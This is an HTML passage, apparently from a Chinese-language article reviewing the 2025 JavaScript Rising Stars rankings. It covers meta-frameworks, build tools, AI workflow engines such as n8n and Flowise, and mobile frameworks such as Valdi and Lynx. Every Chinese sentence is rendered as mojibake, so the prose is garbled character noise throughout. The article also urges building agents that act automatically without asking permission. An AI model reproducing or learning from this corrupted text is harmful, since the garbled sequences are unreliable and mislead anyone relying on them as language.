<p>å»å¹´æ’åç¬¬ä¸€çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fpayloadcms.com%2F" target="_blank" title="https://payloadcms.com/" ref="nofollow noopener noreferrer">Payload æ˜¯ä¸€æ¬¾åŸºäº Next.js çš„æ··åˆå‹æ— å¤´ CMS å’Œç®¡ç†é¢æ¿ã€‚æœ€å¤§çš„æ–°é—»æ˜¯å®ƒ</a><a href="https://link.juejin.cn?target=https%3A%2F%2Fpayloadcms.com%2Fposts%2Fblog%2Fpayload-is-joining-figma" target="_blank" title="https://payloadcms.com/posts/blog/payload-is-joining-figma" ref="nofollow noopener noreferrer">è¢« Figma æ”¶è´­</a>ï¼Œå…¶æœ€ç»ˆç›®æ ‡æ˜¯ç¼©å°è®¾è®¡ä¸ä»£ç ä¹‹é—´çš„å·®è·ã€‚</p>
<p>Next.js 16 å¼•å…¥äº†<a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fblog%2Fnext-16%23cache-components" target="_blank" title="https://nextjs.org/blog/next-16#cache-components" ref="nofollow noopener noreferrer">ç¼“å­˜ç»„ä»¶</a>ï¼Œä½¿ç¼“å­˜æœºåˆ¶æ›´åŠ æ˜ç¡®å’Œçµæ´»ã€‚å¼€å‘è€…å¯ä»¥åˆ›å»ºåŒ…å«æ¥è‡ªæœåŠ¡å™¨çš„åŠ¨æ€å†…å®¹æµçš„é™æ€é¡µé¢æ¡†æ¶ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fastro.build%2F" target="_blank" title="https://astro.build/" ref="nofollow noopener noreferrer">Astro</a> ä½åˆ—ç¬¬å››ï¼Œå®ƒç»§ç»­é—ªè€€ç€å…‰èŠ’ï¼Œä½œä¸ºä¸€ä¸ªå¤šåŠŸèƒ½çš„æ¡†æ¶ï¼Œå¯ä»¥æ„å»ºå†…å®¹ä¸°å¯Œçš„åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚æ‚¨å–œçˆ±çš„ JS Rising Starsï¼ï¼‰ï¼ŒåŒæ—¶æä¾›è‰¯å¥½çš„å¼€å‘è€…ä½“éªŒå¹¶æ³¨é‡æ€§èƒ½ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhono.dev%2F" target="_blank" title="https://hono.dev/" ref="nofollow noopener noreferrer">Hono</a> ä½åˆ—ç¬¬äº”ï¼Œå‡­å€Ÿå…¶è½»é‡çº§æ ¸å¿ƒï¼ˆå¯åœ¨ Node.js è¿è¡Œæ—¶ã€Cloudflare å·¥ä½œè¿›ç¨‹ç­‰å„ç§ç¯å¢ƒä¸­è¿è¡Œï¼‰ä»¥åŠä¸°å¯Œçš„å¤„ç†å™¨å’Œä¸­é—´ä»¶ç”Ÿæ€ç³»ç»Ÿï¼Œæˆä¸ºç°ä»£ Web æœåŠ¡å™¨çš„æ ‡å‡†ï¼ˆå³ä½¿ <a href="https://link.juejin.cn?target=https%3A%2F%2Fexpressjs.com%2F" target="_blank" title="https://expressjs.com/" ref="nofollow noopener noreferrer">Express ä»ç„¶æµè¡Œï¼ï¼‰ã€‚</a></p>
<p>å…ƒæ¡†æ¶ç±»åˆ«ä¸­æœ€å¤§çš„å˜åŒ–æ˜¯<a href="https://link.juejin.cn?target=https%3A%2F%2Ftanstack.com%2Fstart%2Flatest" target="_blank" title="https://tanstack.com/start/latest" ref="nofollow noopener noreferrer">Tanstack Start</a>çš„å´›èµ·ï¼Œå¦‚æœä½ æƒ³åœ¨ React ä¹‹ä¸Šæ„å»ºå…¨æ ˆåº”ç”¨ç¨‹åºï¼Œå®ƒæ˜¯ Next.js çš„æœ€ä½³æ›¿ä»£æ–¹æ¡ˆä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-8">6. å·¥å…·</h2>
<p>å·¥å…· Top 5 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06a12e0f133d4e70acc67461df248a82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=cC8H9AIzxFl4f5kri5a72rYE6Mc%3D" alt="" loading="lazy"/></p>
<p>Bun çš„æŒç»­åŠªåŠ›æœ€ç»ˆè·å¾—äº†å›æŠ¥ï¼Œè¿™æ¬¾ä¸€ä½“åŒ– JavaScript å·¥å…·åŒ…è£ç™»æ¦œé¦–ã€‚åœ¨è¿‡å»çš„ä¸€å¹´ä¸­ï¼Œå®ƒä¸æ–­æå‡æ€§èƒ½ã€å¢å¼ºå¯¹<a href="https://link.juejin.cn?target=https%3A%2F%2Fbun.com%2Fblog%2Fbun-v1.2%23node-js-compatibility" target="_blank" title="https://bun.com/blog/bun-v1.2#node-js-compatibility" ref="nofollow noopener noreferrer">Node.js çš„å…¼å®¹æ€§</a>ï¼Œå¹¶æ¨å‡ºè®¸å¤šå®ç”¨æ–°åŠŸèƒ½ï¼Œä½¿å…¶æˆä¸º<a href="https://link.juejin.cn?target=https%3A%2F%2Fbun.com%2Fblog%2Fbun-v1.3%23full-stack-javascript-runtime" target="_blank" title="https://bun.com/blog/bun-v1.3#full-stack-javascript-runtime" ref="nofollow noopener noreferrer">å…¨æ ˆ JavaScript å¼€å‘çš„ç†æƒ³å¹³å°</a>ã€‚å¹´åº•ï¼ŒBun è¢« Anthropic æ”¶è´­ï¼Œæˆ‘ä»¬éå¸¸æœŸå¾… 2026 å¹´ Bun çš„å‘å±•ã€‚</p>
<p>ä»Šå¹´å¯¹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2F" target="_blank" title="https://voidzero.dev/" ref="nofollow noopener noreferrer">void(0)</a> æ¥è¯´ä¹Ÿæ„ä¹‰éå‡¡ã€‚è¯¥å…¬å¸<a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2Fposts%2Fannouncing-voidzero-inc" target="_blank" title="https://voidzero.dev/posts/announcing-voidzero-inc" ref="nofollow noopener noreferrer">åœ¨ 2024 å¹´åº•å®£å¸ƒ</a>ï¼Œå…¶æ­£åœ¨å¼€å‘æ–°ä¸€ä»£å‰ç«¯åŸºç¡€è®¾æ–½å·¥å…·ï¼ˆOxc å’Œ Rolldownï¼‰ï¼Œå¹¶å·²è®©æˆ‘ä»¬å¾—ä»¥ä¸€çª¥æœªæ¥å‘å±•æ–¹å‘ã€‚å…¶æ——èˆ°é¡¹ç›® Vite åœ¨è¿™ä¸€å¹´ä¸­æŒç»­æ”¹è¿›ï¼Œç¨³å®šäº†æ–°çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fmain.vite.dev%2Fguide%2Fapi-environment" target="_blank" title="https://main.vite.dev/guide/api-environment" ref="nofollow noopener noreferrer">Environment API</a>ï¼Œå¹¶å®ç°äº†å¯¹<a href="https://link.juejin.cn?target=https%3A%2F%2Fvite.dev%2Fblog%2Fannouncing-vite8-beta" target="_blank" title="https://vite.dev/blog/announcing-vite8-beta" ref="nofollow noopener noreferrer">åŸºäº Rust çš„å…¨æ–°æ‰“åŒ…å·¥å…· Rolldown çš„</a>æ”¯æŒã€‚è¯¥é¡¹ç›®ç”šè‡³è¿˜æ‹¥æœ‰äº†è‡ªå·±çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DbmWQqAKLgT4" target="_blank" title="https://www.youtube.com/watch?v=bmWQqAKLgT4" ref="nofollow noopener noreferrer">çºªå½•ç‰‡</a>ã€‚Vitest ä¹Ÿå‘å¸ƒäº†å…¶æœ€å—æœŸå¾…çš„åŠŸèƒ½ä¹‹ä¸€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2Fposts%2Fannouncing-vitest-4" target="_blank" title="https://voidzero.dev/posts/announcing-vitest-4" ref="nofollow noopener noreferrer">æµè§ˆå™¨æ¨¡å¼</a>ã€‚Oxc ç”Ÿæ€ç³»ç»Ÿä¸­æ¶Œç°å‡ºè®¸å¤šä»¤äººå…´å¥‹çš„æ–°é¡¹ç›®ï¼Œå®ƒä»¬å°†æˆä¸ºç°æœ‰å·¥å…·æå…·å¸å¼•åŠ›çš„æ›¿ä»£æ–¹æ¡ˆï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Foxc.rs%2Fblog%2F2025-06-10-oxlint-stable.html" target="_blank" title="https://oxc.rs/blog/2025-06-10-oxlint-stable.html" ref="nofollow noopener noreferrer">Oxlint</a>æœ‰æœ›æˆä¸ºæ–°ä¸€ä»£ ESLintï¼Œè€Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Foxc.rs%2Fblog%2F2025-12-01-oxfmt-alpha.html" target="_blank" title="https://oxc.rs/blog/2025-12-01-oxfmt-alpha.html" ref="nofollow noopener noreferrer">Oxfmt åˆ™</a>å¯èƒ½æˆä¸ºæ–°ä¸€ä»£ Prettierã€‚è¯¥å…¬å¸åœ¨å¹´åº•å®Œæˆäº†<a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2Fposts%2Fannouncing-series-a" target="_blank" title="https://voidzero.dev/posts/announcing-series-a" ref="nofollow noopener noreferrer">æ–°ä¸€è½® A è½®èèµ„</a>ï¼Œå¹¶å‘å¸ƒäº†å…¶é¦–æ¬¾å•†ä¸šäº§å“<a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2Fposts%2Fannouncing-vite-plus" target="_blank" title="https://voidzero.dev/posts/announcing-vite-plus" ref="nofollow noopener noreferrer">Vite+</a>ã€‚</p>
<p>å€¼å¾—ä¸€æçš„è¿˜æœ‰<a href="https://link.juejin.cn?target=https%3A%2F%2Frspack.rs%2F" target="_blank" title="https://rspack.rs/" ref="nofollow noopener noreferrer">Rspack</a>ã€‚è¿™æ¬¾æ¥è‡ªå­—èŠ‚è·³åŠ¨çš„åŸºäº Rust çš„æ‰“åŒ…å·¥å…·ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œè€Œä¸”å¯ä»¥å³æ’å³ç”¨ï¼Œæ˜¯ webpack çš„æ›¿ä»£æ–¹æ¡ˆï¼Œå› æ­¤å®ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fnpmtrends.com%2F%40rspack%2Fcore" target="_blank" title="https://npmtrends.com/@rspack/core" ref="nofollow noopener noreferrer">ä»Šå¹´è¢«å¹¿æ³›é‡‡ç”¨</a>ä¹Ÿå°±ä¸è¶³ä¸ºå¥‡äº†ã€‚æ›´å¹¿æ³›çš„ Rstack ç”Ÿæ€ç³»ç»Ÿä¹Ÿå€¼å¾—å…³æ³¨ï¼Œå®ƒå‚¬ç”Ÿäº†<a href="https://link.juejin.cn?target=https%3A%2F%2Frstest.rs%2F" target="_blank" title="https://rstest.rs/" ref="nofollow noopener noreferrer">Rstest</a>å’Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Frslint.org%2F" target="_blank" title="https://rslint.org/" ref="nofollow noopener noreferrer">Rslint</a>ç­‰æ–°å·¥å…·ã€‚</p>
<p>Next.js æœ€è¿‘å°†é»˜è®¤æ‰“åŒ…å·¥å…·<a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fblog%2Fnext-16%23turbopack-stable" target="_blank" title="https://nextjs.org/blog/next-16#turbopack-stable" ref="nofollow noopener noreferrer">åˆ‡æ¢ä¸º Turbopack</a> ï¼Œç›¸æ¯”ä¹‹å‰çš„æ‰“åŒ…å·¥å…· webpackï¼Œé€Ÿåº¦æœ‰äº†æ˜¾è‘—æå‡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¹Ÿå¯ä»¥<a href="https://link.juejin.cn?target=https%3A%2F%2Frspack.rs%2Fblog%2Frspack-next-partner" target="_blank" title="https://rspack.rs/blog/rspack-next-partner" ref="nofollow noopener noreferrer">ä½¿ç”¨ Rspack æ„å»º Next.js åº”ç”¨</a>ã€‚</p>
<p>å°½ç®¡å°šæœªå®Œå…¨æˆç†Ÿï¼Œä½†å¾®è½¯ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdevblogs.microsoft.com%2Ftypescript%2Ftypescript-native-port%2Fhttps%3A%2F%2Fdevblogs.microsoft.com%2Ftypescript%2Ftypescript-native-port%2F" target="_blank" title="https://devblogs.microsoft.com/typescript/typescript-native-port/https://devblogs.microsoft.com/typescript/typescript-native-port/" ref="nofollow noopener noreferrer">Go è¯­è¨€é‡å†™ TypeScript</a>æ— ç–‘æ˜¯ä»Šå¹´æœ€é‡è¦çš„å…¬å‘Šä¹‹ä¸€ï¼Œè¿™å°†æ˜¾è‘—æå‡å…¶é€Ÿåº¦ã€‚å›¢é˜Ÿè¿‘æœŸ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevblogs.microsoft.com%2Ftypescript%2Fprogress-on-typescript-7-december-2025%2F" target="_blank" title="https://devblogs.microsoft.com/typescript/progress-on-typescript-7-december-2025/" ref="nofollow noopener noreferrer">åˆ†äº«äº†æœ€æ–°è¿›å±•</a>ï¼ŒåŸç”Ÿ TypeScript ä½“éªŒä¼¼ä¹å·²ç»å‡†å¤‡å¥½è¿æ¥æ—©æœŸç”¨æˆ·ã€‚TypeScript 6.0 å°†æ˜¯æœ€åä¸€ä¸ªåŸºäº JavaScript çš„ç‰ˆæœ¬ï¼Œå®ƒå°†ä½œä¸ºè¿‡æ¸¡åˆ° TypeScript 7.0ï¼ˆGo é‡å†™ç‰ˆï¼‰çš„æ¡¥æ¢ã€‚å±•æœ› 2025 å¹´ï¼Œç°ä»£åŸºç¡€è®¾æ–½å·¥å…·è¶Šæ¥è¶Šå¤šåœ°æºè‡ªå¤§å‹ä¼ä¸šæˆ–é£é™©æŠ•èµ„æ”¯æŒçš„å…¬å¸ï¼Œè¿™å¼•å‘äº†ä¸€ä¸ªé‡è¦é—®é¢˜ï¼šæˆç†Ÿçš„ã€ç¤¾åŒºé©±åŠ¨çš„é¡¹ç›®èƒ½å¦åœ¨æœªæ¥ä¸€å¹´ä¿æŒç«äº‰åŠ›ï¼Ÿ</p>
<h2 data-id="heading-9">7. äººå·¥æ™ºèƒ½</h2>
<p>äººå·¥æ™ºèƒ½ Top 10 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74036c20abac48289c5af6dc3491b66e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=chKX8nRWjWklwrLGTDiU0ogiyP4%3D" alt="" loading="lazy"/></p>
<p>èŠå¤©æœºå™¨äººæ—¶ä»£å·²ç»ç»“æŸã€‚å¦‚ä»Šå¼€å‘è€…ä»¬æ›´å…³æ³¨çš„å·¥å…·å¹¶éèŠå¤©æœºå™¨äººåº“æˆ–æç¤ºå™¨ï¼Œè€Œæ˜¯å·¥ä½œæµå¼•æ“ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fn8n.io%2F" target="_blank" title="https://n8n.io/" ref="nofollow noopener noreferrer">n8n</a> çš„è¡¨ç°ä»¤äººç©ç›®ï¼Œé¢„è®¡ 2025 å¹´ç”¨æˆ·æ•°é‡å°†å¢é•¿ 11.2 ä¸‡ã€‚è¿™å¹¶ä¸ä»¤äººæ„å¤–ï¼Œn8n æ­£åœ¨æˆä¸ºè¿æ¥å‰æ²¿æ¨¡å‹å’Œæ„å»ºè¿™äº›ä»£ç†å·¥å…·çš„é¦–é€‰å·¥å…·ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdyad.sh%2F" target="_blank" title="https://dyad.sh/" ref="nofollow noopener noreferrer">Dyad</a> ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fflowiseai.com%2F" target="_blank" title="https://flowiseai.com/" ref="nofollow noopener noreferrer">Flowise</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fmastra.ai%2F" target="_blank" title="https://mastra.ai/" ref="nofollow noopener noreferrer">Mastra</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fstagehand.dev%2F" target="_blank" title="https://stagehand.dev/" ref="nofollow noopener noreferrer">Stagehand</a> ç­‰å…¬å¸å ªç§°è‡ªåŠ¨åŒ–å’Œä»£ç†å·¥ä½œæµé¢†åŸŸçš„ä½¼ä½¼è€…ã€‚Vercel ä»ç„¶æ˜¯é‚£äº›å¸Œæœ›ä»åº•å±‚æŒæ§èŠå¤©å’Œä»£ç†æµç¨‹çš„ç”¨æˆ·çš„é¦–é€‰ï¼ˆä½†ä»–ä»¬ä¹Ÿåœ¨ä¸æ–­æ·»åŠ ä»£ç†åŠŸèƒ½ï¼‰ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTanStack%2Fai" target="_blank" title="https://github.com/TanStack/ai" ref="nofollow noopener noreferrer">TanStack AI</a> è™½ç„¶æ˜¯åèµ·ä¹‹ç§€ï¼Œä½†å‡­å€Ÿå…¶å¼ºå¤§çš„ä»£ç†åŠŸèƒ½ï¼Œæ­£åœ¨è¿…é€Ÿå´›èµ·ã€‚</p>
<p>æ‰€ä»¥ï¼Œè¿™æ˜¯ä½ ä»¬ 2026 å¹´çš„ä½œä¸šï¼šåˆ«å†é—®â€œå¦‚ä½•è®©æˆ‘çš„ LLM åšå‡ºæ›´å¥½çš„å›åº”â€ï¼Œè€Œæ˜¯å¼€å§‹é—®â€œå“ªäº›å·¥ä½œæµç¨‹å¯ä»¥å®Œå…¨äº¤ç»™ AI å¤„ç†ï¼Ÿâ€</p>
<p>é€‰æ‹© n8n æˆ– <a href="https://link.juejin.cn?target=https%3A%2F%2Fflowiseai.com%2F" target="_blank" title="https://flowiseai.com/" ref="nofollow noopener noreferrer">Flowise</a>ï¼Œæ„å»ºä¸€ä¸ªèƒ½å¤Ÿæ ¹æ®äº‹ä»¶è§¦å‘ã€æ¨ç†é€‰é¡¹å¹¶è‡ªåŠ¨æ‰§è¡Œæ“ä½œçš„ç¨‹åºï¼Œæ— éœ€å¾å¾—è®¸å¯ã€‚æ­å»ºä¸€ä¸ª<a href="https://link.juejin.cn?target=https%3A%2F%2Fmastra.ai%2F" target="_blank" title="https://mastra.ai/" ref="nofollow noopener noreferrer">Mastra</a> ä»£ç†ï¼Œä½¿å…¶èƒ½å¤Ÿè·¨å¤šä¸ªå·¥å…·å’Œå¹³å°è¿›è¡Œåè°ƒã€‚å°è¯•ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fstagehand.dev%2F" target="_blank" title="https://stagehand.dev/" ref="nofollow noopener noreferrer">Stagehand</a> æ¥è‡ªåŠ¨åŒ–æµè§ˆå™¨ä»»åŠ¡ã€‚</p>
<p>èŠå¤©æœºå™¨äººåªæ˜¯è¾…åŠ©è½®ï¼Œæ˜¯æ—¶å€™å¸æ‰å®ƒä»¬äº†ã€‚</p>
<p>å“¦ï¼Œè¿˜æœ‰ï¼Œè¯·å…³æ³¨ä¸€ä¸‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cloudflare.com%2Fcode-mode%2F" target="_blank" title="https://blog.cloudflare.com/code-mode/" ref="nofollow noopener noreferrer">â€œcode modeâ€</a>è¿™åŒ¹é»‘é©¬ã€‚å®ƒå¯èƒ½æ˜¯è‡ª MCP ä»¥æ¥è¿™ä¸ªé¢†åŸŸæœ€é‡å¤§çš„çªç ´ã€‚</p>
<h2 data-id="heading-10">8. ç§»åŠ¨ç«¯</h2>
<p>ç§»åŠ¨ç«¯ Top 10 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/951a4e490a0143cba4bd5e651c97bb4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=5aD6WBCeP4awoF22c3r3EDvIG%2BM%3D" alt="" loading="lazy"/></p>
<p>åœ¨ JavaScript Rising Stars è¯„é€‰æ´»åŠ¨é•¿è¾¾åå¹´çš„å†å²ä¸­ï¼ŒReact Native åŠå…¶ä¸»è¦å…ƒæ¡†æ¶ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.expo.dev%2F" target="_blank" title="https://docs.expo.dev/" ref="nofollow noopener noreferrer">Expo</a> é¦–æ¬¡æœªèƒ½è·»èº«ç§»åŠ¨ç«¯æ¦œé¦–ã€‚å–è€Œä»£ä¹‹çš„æ˜¯ä¸¤ä¸ªæ–°æ™‹æ¡†æ¶ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSnapchat%2FValdi" target="_blank" title="https://github.com/Snapchat/Valdi" ref="nofollow noopener noreferrer">Valdi</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Flynxjs.org%2F" target="_blank" title="https://lynxjs.org/" ref="nofollow noopener noreferrer">Lynxâ€”â€”</a>å®ƒä»¬åˆ†åˆ«æ˜¯ Snapï¼ˆSnapchat çš„æ¯å…¬å¸ï¼‰å’Œå­—èŠ‚è·³åŠ¨ï¼ˆTikTok çš„æ¯å…¬å¸ï¼‰çš„å†…éƒ¨æ¡†æ¶ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSnapchat%2FValdi" target="_blank" title="https://github.com/Snapchat/Valdi" ref="nofollow noopener noreferrer">Valdi</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Flynxjs.org%2F" target="_blank" title="https://lynxjs.org/" ref="nofollow noopener noreferrer">Lynx</a>å¯¹ React Native å¼€å‘è€…æ¥è¯´å¹¶ä¸é™Œç”Ÿã€‚å®ƒä»¬éƒ½å€Ÿé‰´äº† Web æŠ€æœ¯ï¼Œèƒ½å¤Ÿæ¸²æŸ“åŸç”Ÿè§†å›¾ï¼ŒåŒæ—¶æ”¯æŒ TypeScriptã€JSXã€Flexbox å¸ƒå±€ã€çƒ­é‡è½½å’Œ CSSã€‚Valdi ç»„ä»¶çš„å¤–è§‚ä¸ React ç±»ç»„ä»¶<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSnapchat%2FValdi%2Fblob%2Fmain%2Fdocs%2Fdocs%2Fcore-component.md" target="_blank" title="https://github.com/Snapchat/Valdi/blob/main/docs/docs/core-component.md" ref="nofollow noopener noreferrer">ç±»ä¼¼</a>ï¼Œè€Œ Lynx åˆ™åŒæ—¶æ”¯æŒå‘½ä»¤å¼ API å’ŒåŠŸèƒ½é½å…¨çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Flynxjs.org%2Fguide%2Fstart%2Fquick-start%3Fios-simulator-platform%3Dmacos-arm64%26explorer-platform%3Dios-simulator" target="_blank" title="https://lynxjs.org/guide/start/quick-start?ios-simulator-platform=macos-arm64&amp;explorer-platform=ios-simulator" ref="nofollow noopener noreferrer">React æŠ½è±¡å±‚</a>ï¼ˆé»˜è®¤æƒ…å†µä¸‹æ¨èä½¿ç”¨åè€…ï¼‰ã€‚</p>
<p>å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«åœ¨äºå®ƒä»¬é’ˆå¯¹çš„ä¸šåŠ¡éœ€æ±‚è¿›è¡Œäº†ä¼˜åŒ–ã€‚Valdi çš„è®¾è®¡ç›®æ ‡æ˜¯è½»é‡çº§ã€å»¶è¿ŸåŠ è½½å’Œå¯æ‰©å±•ï¼Œä»è€Œæ”¯æŒç”¨æˆ·é€å±é€‰æ‹©æ€§åœ°<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSnapchat%2FValdi%2Fblob%2Fmain%2Fdocs%2Fdocs%2Ffaq.md%23why-did-snap-create-this" target="_blank" title="https://github.com/Snapchat/Valdi/blob/main/docs/docs/faq.md#why-did-snap-create-this" ref="nofollow noopener noreferrer">å¯ç”¨æ–°åŠŸèƒ½</a>ï¼Œè€Œä¸ä¼šé€ æˆæ˜¾è‘—çš„æ€§èƒ½æŸå¤±ã€‚Lynx çš„è®¾è®¡ç›®æ ‡æ˜¯æä¾›ä¸°å¯Œçš„äº¤äº’ä½“éªŒï¼Œå®ƒé‡‡ç”¨<a href="https://link.juejin.cn?target=https%3A%2F%2Flynxjs.org%2Fnext%2Fblog%2Flynx-unlock-native-for-more%23use-the-main-thread-responsibly-for-interactivity" target="_blank" title="https://lynxjs.org/next/blog/lynx-unlock-native-for-more#use-the-main-thread-responsibly-for-interactivity" ref="nofollow noopener noreferrer">åŒçº¿ç¨‹æ¶æ„ï¼Œ</a>æä¾›ç±»ä¼¼ Web çš„æŠ½è±¡å±‚ï¼Œé¿å…å•çº¿ç¨‹ç“¶é¢ˆã€‚</p>
<p>ä½†å®ƒä»¬å¹¶éå”¯ä¸€æ’¼åŠ¨ React Native éœ¸ä¸»åœ°ä½çš„æ–°å…´æ¡†æ¶ã€‚æ’åç¬¬å››çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdioxuslabs.com%2F" target="_blank" title="https://dioxuslabs.com/" ref="nofollow noopener noreferrer">Dioxus</a> æ˜¯ä¸€ä¸ªé›„å¿ƒå‹ƒå‹ƒçš„æ¡†æ¶ï¼Œæ—¨åœ¨åŸºäº Web æŠ€æœ¯æ‰“é€ â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdioxuslabs.com%2Flearn%2F0.7%2F%23what-is-dioxus" target="_blank" title="https://dioxuslabs.com/learn/0.7/#what-is-dioxus" ref="nofollow noopener noreferrer">æ›´ä¼˜ç§€çš„ Flutter</a> â€ï¼Œä½†åˆæ— éœ€åŠŸèƒ½é½å…¨çš„ Web è§†å›¾ã€‚</p>
<p>è™½ç„¶ç›®å‰ Dioxus é»˜è®¤ä½¿ç”¨ç³»ç»Ÿ Web è§†å›¾ï¼Œä½†å…¶é•¿æœŸç›®æ ‡æ˜¯ç¨³å®š <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FDioxusLabs%2Fblitz" target="_blank" title="https://github.com/DioxusLabs/blitz" ref="nofollow noopener noreferrer">Blitz</a> â€”â€”ä¸€ä¸ªè½»é‡çº§çš„ Web æ¸²æŸ“å™¨ï¼Œå®ƒé€šè¿‡<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgfx-rs%2Fwgpu" target="_blank" title="https://github.com/gfx-rs/wgpu" ref="nofollow noopener noreferrer">wgpu</a>ä½¿ç”¨åŸç”Ÿå›¾å½¢ APIï¼ˆä¾‹å¦‚ Vulkan å’Œ Metalï¼‰è¿›è¡Œç»˜åˆ¶ã€‚ç›®å‰ï¼ŒDioxus åº”ç”¨ä»…æ”¯æŒ Rust è„šæœ¬ï¼Œä½†æœªæ¥è®¡åˆ’æ”¯æŒæ›´å¤šè¯­è¨€ã€‚</p>
<h2 data-id="heading-11">9. Vue ç”Ÿæ€ç³»ç»Ÿ</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cd61abad1e949d0a91c6a66ec808457~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=Vf0K2EbbtocNQJnNkKlzDcALgrY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">10. çŠ¶æ€ç®¡ç†</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fddc5efa1be4b279a8ea66b6f37e405~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=5FKAJ3nYpeaIvKBVEBtosJnMA78%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-13">11. æ ·å¼ / CSS in JS</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e466df1b55c4ba79374aa1cd518a87b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=figdZsRJeRuUIBzO7jKEALiq798%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-14">12. ç»„ä»¶åº“</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bda131f86544a5090e48a32a1da3a30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=d6sxAU69HNVrIiomscjcfuYtUpQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15">13. æµ‹è¯•</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/852157b412d04a849b47c06a695a68a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=Sz21mrefBVUKuUI9FpQIEBSsp04%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-16">14. æ¡Œé¢ç«¯</h2>

